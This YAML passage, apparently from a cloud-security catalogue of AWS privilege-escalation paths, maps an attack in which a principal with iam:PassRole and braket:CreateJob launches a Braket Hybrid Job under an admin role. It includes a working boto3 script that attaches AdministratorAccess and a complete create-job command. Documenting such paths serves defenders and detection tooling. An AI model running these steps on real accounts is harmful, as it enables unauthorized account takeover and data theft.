  prowler: https://github.com/prowler-cloud/prowler/blob/c610d9ac3157a8ffd3ca43353febc5817e50fb86/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L354

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with iam:PassRole and braket:CreateJob permissions. Can be an IAM user or role.

    - id: braket_job
      label: New Braket Hybrid Job
      type: resource
      description: |
        New Amazon Braket Hybrid Job created with a privileged IAM role passed as the jobExecutionRoleArn. The Hybrid Job runs a containerized Python script on ML instance infrastructure (e.g., ml.m5.large). The entry point script is sourced from an attacker-controlled S3 bucket and executes automatically when the job starts.

    - id: exec_role
      label: Job Execution Role
      type: principal
      description: |
        IAM role passed to the Braket Hybrid Job as the jobExecutionRoleArn. The role must trust braket.amazonaws.com to assume it. Once the job starts, the container runs with this role's credentials automatically injected by the Braket service. The attacker's Python entry point script calls IAM APIs using these credentials.

    - id: exploit_script
      label: Python Entry Point Script
      type: payload
      color: '#99ccff'
      description: |
        Malicious Python script uploaded to an attacker-controlled S3 bucket and referenced as the job's entry point. When the Braket Hybrid Job runs, this script executes with the job execution role's credentials and calls iam:AttachUserPolicy to attach AdministratorAccess to the starting principal.

        Example exploit script:
        ```python
        import boto3, os

        def main():
            iam = boto3.client("iam")
            user = os.environ.get("ATTACKER_USER", "STARTING_USER")
            iam.attach_user_policy(
                UserName=user,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
        ```

        The script is specified via `--algorithm-specification scriptModeConfig.entryPoint` and the S3 URI in the CreateJob call.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The job execution role has AdministratorAccess or equivalent permissions. The Python script successfully calls iam:AttachUserPolicy, elevating the starting principal to full administrative access across the AWS account.

    - id: some_perms
      label: Some additional access
      type: outcome
      color: '#ffeb99'
      description: |
        The job execution role has some elevated permissions but not full admin. The script can leverage these permissions for data exfiltration (S3, DynamoDB, Secrets Manager), security configuration changes, or additional privilege escalation paths.

    - id: no_access
      label: No additional access
      type: outcome
      color: '#cccccc'
      description: |
        The job execution role only has minimal permissions (e.g., logs:PutLogEvents, s3:PutObject on a specific bucket). The privilege escalation provides limited value despite the script executing successfully.

  edges:
    - from: start
      to: braket_job
      label: iam:PassRole + braket:CreateJob
      description: |
        Create a new Braket Hybrid Job and pass the target admin role as the jobExecutionRoleArn. The job references the malicious Python script in S3 as its entry point.

        Command:
        ```bash
        aws braket create-job \
          --job-name privesc-braket-job \
          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --algorithm-specification '{
            "scriptModeConfig": {
              "entryPoint": "exploit:main",
              "s3Uri": "s3://ATTACKER_BUCKET/exploit/exploit.py",
              "compressionType": "NONE"
            }
          }' \
          --output-data-config '{"s3Path": "s3://ATTACKER_BUCKET/output"}' \
          --instance-config '{"instanceType": "ml.m5.large", "instanceCount": 1, "volumeSizeInGb": 1}' \
          --device-config '{"device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"}' \
          --hyper-parameters '{"ATTACKER_USER": "STARTING_USER"}' \
          --stopping-condition '{"maxRuntimeInSeconds": 300}'
        ```

    - from: braket_job
      to: exec_role
      label: Job assumes jobExecutionRoleArn
      description: |
        The Braket Hybrid Job container starts and automatically assumes the IAM role specified in jobExecutionRoleArn. The role's temporary credentials are injected into the container environment and are available to the Python script via the boto3 default credential chain.

    - from: exec_role
      to: exploit_script
      label: Script executes with role credentials
      description: |
        The Python entry point script runs within the job container using the execution role's credentials. The script uses boto3 (pre-installed in Braket containers) to make IAM API calls, with no additional credential configuration required.

    - from: exploit_script
      to: admin
      label: If role has admin or IAM write permissions
      branch: A
      condition: admin
      description: |
        If the job execution role has AdministratorAccess or IAM write permissions (iam:AttachUserPolicy), the script successfully attaches AdministratorAccess to the starting principal. The privilege escalation is confirmed once the job reaches COMPLETED status.

    - from: exploit_script
      to: some_perms
      label: If role has some elevated permissions
      branch: B
      condition: some_permissions
      description: |
        If the job execution role has elevated but non-admin permissions, the script can still perform meaningful actions such as reading sensitive data from S3 or Secrets Manager, modifying infrastructure, or staging further privilege escalation attempts.

    - from: exploit_script
      to: no_access
      label: If role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the job execution role only has minimal permissions, the script cannot perform meaningful privilege escalation. The attack provides limited value despite the job executing successfully.
